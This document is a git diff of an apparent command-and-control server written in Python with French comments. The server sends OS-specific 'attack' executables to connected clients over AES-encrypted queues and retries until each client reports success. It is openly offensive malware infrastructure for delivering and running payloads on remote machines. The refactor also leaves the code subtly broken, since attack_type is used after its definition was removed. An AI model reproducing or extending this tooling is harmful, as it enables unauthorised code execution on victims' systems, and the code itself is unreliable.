@@ -21,7 +21,7 @@ from queue import Queue, Empty
 
 def format_attack_data(type, id, data):
 
-    json_data = json.loads('{"id":"'+str(id)+'","attack":"'+type+'","arg1":"stealth,t5","arg2":"nono","arg3":""}')
+    json_data = json.loads('{"id":"'+str(id)+'","attack":"'+type+'"}')
 
 
     print("\t\t(+) data : " + str(data))
@@ -30,6 +30,66 @@ def format_attack_data(type, id, data):
     print("\t\t(+) data formed as json")
 
     return json_data
+
+
+
+
+def send_executable_to_client(attack_type, client_os, client_sym_key, client_iv, client_reception_queue, client_emission_queue):
+    #Récupérer os du client 
+    if client_os == "windows":
+        executable_path = 'actions/windows/' + attack_type + '.exe'
+    else:
+        executable_path = 'actions/linux/' + attack_type
+
+    if os.path.isfile(executable_path):
+        with open(executable_path, 'rb') as f:
+            executable_data = f.read()
+        
+        # Chiffrer l'exécutable
+        cipher = AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
+        file_encrypted = cipher.encrypt(pad(executable_data, AES.block_size))
+
+
+        # Envois de la taille
+        len_file_encrypted = len(file_encrypted)
+        print("\t[+] Envoi de la taille de l'executable :", len_file_encrypted)
+
+        cipher_file_size= AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
+        file_size_encrypted = cipher_file_size.encrypt(pad(str(len_file_encrypted).encode(), AES.block_size))
+        client_emission_queue.put(file_size_encrypted)
+
+
+        # Réception de la taille de l'éxécutable reçu par le client
+        encrypted_data_received = client_reception_queue.get(timeout=3)
+        
+        cipher_len_buffer= AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
+        decrypt_size = unpad(cipher_len_buffer.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')
+
+        print("\t[+] Reception de la taille :", decrypt_size)
+
+        # Compare si la taille de l'éxécutable envoyé à bien était reçu par le client
+        if int(len_file_encrypted) == int(decrypt_size) :
+            client_emission_queue.put(file_encrypted)
+            print("\t[+] L'exécutable a été envoyé")
+
+
+            # reception du code retour du client
+            return_code_encrypted = client_reception_queue.get(timeout=3)
+            
+            cipher_len_buffer= AES.new(client_sym_key, AES.MODE_CBC, iv=client_iv)
+            return_code = unpad(cipher_len_buffer.decrypt(return_code_encrypted), AES.block_size).decode('utf-8')
+
+            if return_code == "OK":
+                return 1
+            else :
+                return 0
+        else:
+            print("Les tailles ne correspondent pas.")
+            return 0 # Le client n'a pas reçu
+                        
+    else:
+        print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")
+        return -1 # erreur concernant l'envoi
 
 
 
@@ -66,48 +126,15 @@ def execute_attack(client, attack):
         else:
             # envoyer l'exécutable 
             print("\t[!] Le client n'a pas l'exécutable")
-            attack_type = attack[2]
-            #Récupérer os du client 
-            if client['os'] == "windows":
-                executable_path = 'actions/windows/' + attack_type + '.exe'
-            else:
-                executable_path = 'actions/linux/' + attack_type
 
-            if os.path.isfile(executable_path):
-                with open(executable_path, 'rb') as f:
-                    executable_data = f.read()
-                
-                # Chiffrer l'exécutable
-                cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                file_encrypted = cipher.encrypt(pad(executable_data, AES.block_size))
+            client_received = 0
 
+            while client_received == 0 :
+                client_received = send_executable_to_client(attack_type, client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'])
 
-                # Envois de la taille
-                len_file_encrypted = len(file_encrypted)
-                print("\t[+] Envoi de la taille de l'executable :", len_file_encrypted)
+                if client_received == -1:
+                    print("\t[!] L'executable n'est pas sur le serveur")
 
-                cipher_file_size= AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                file_size_encrypted = cipher_file_size.encrypt(pad(str(len_file_encrypted).encode(), AES.block_size))
-                client['emission_queue'].put(file_size_encrypted)
-
-
-                # Réception de la taille de l'éxécutable reçu par le client
-                encrypted_data_received = client['reception_queue'].get(timeout=3)
-                
-                cipher_len_buffer= AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                decrypt_size = unpad(cipher_len_buffer.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')
-
-                print("\t[+] Reception de la taille :", decrypt_size)
-
-                # Compare si la taille de l'éxécutable envoyé à bien était reçu par le client
-                if int(len_file_encrypted) == int(decrypt_size) :
-                    client['emission_queue'].put(file_encrypted)
-                    print("\t[+] L'exécutable a été envoyé")
-                else:
-                    print("Les tailles ne correspondent pas.")
-                                
-            else:
-                print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")
     except Empty:
         print("\t[!] Le client n'a pas répondu")
         pass
